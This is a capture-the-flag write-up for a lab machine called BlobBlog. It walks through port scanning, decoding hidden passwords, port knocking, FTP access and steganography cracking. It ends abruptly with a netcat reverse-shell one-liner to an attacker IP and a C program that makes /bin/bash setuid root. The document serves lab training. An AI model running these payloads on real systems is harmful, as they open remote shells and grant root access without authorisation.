# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx blobblog.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV blobblog.thm
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# HTTP (port 80)
found a base64, decode it and give us a brainfuck code
execute the brain code fuck give us that : 
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!

bottom of the page, we found that
```
<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->
```

decode from base58, it gives us : cUpC4k3s


seems we need to knock to port 1 then 3 then 5
we redo a nmap and find more port

```
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.2
22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
445/tcp  open     http    Apache httpd 2.4.7 ((Ubuntu))
5355/tcp filtered llmnr
8080/tcp open     http    Werkzeug httpd 1.0.1 (Python 3.5.3)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

ok let's enumerate more on port 80\
it seems there is nothing more

# FTP (port 21)

we can use previous code to login to ftp
bob:cUpC4k3s

we found 2 files :
- cool.jpeg
- examples.desktop

```
┌──(kali㉿kali)-[~/thm/BlobBlog]
└─$ stegseek --crack cool.jpeg /usr/share/wordlists/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "p@55w0rd"       
[i] Original filename: "out.txt".
[i] Extracting to "cool.jpeg.out".

┌──(kali㉿kali)-[~/thm/BlobBlog]
└─$ cat cool.jpeg.out 
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
```

# HTTP (port 445)
http://blobblog.thm:445/bobs_safe_for_stuff
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter

http://blobblog.thm:445/user
we found a openssl private key but cant use it

# HTTP (port 8080)
we found an other url on 8080
http://blobblog.thm:8080/blog
http://blobblog.thm:8080/login
http://blobblog.thm:8080/review

we vigenère cipher with zcv and can decrypt it with passphrase youmayenter
bob:d1ff3r3ntP@55w0rd

rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6666 >/tmp/f


#include <sys/stat.h>

int main(void) {
  chmod("/bin/bash", 04777);
  return 0;
}
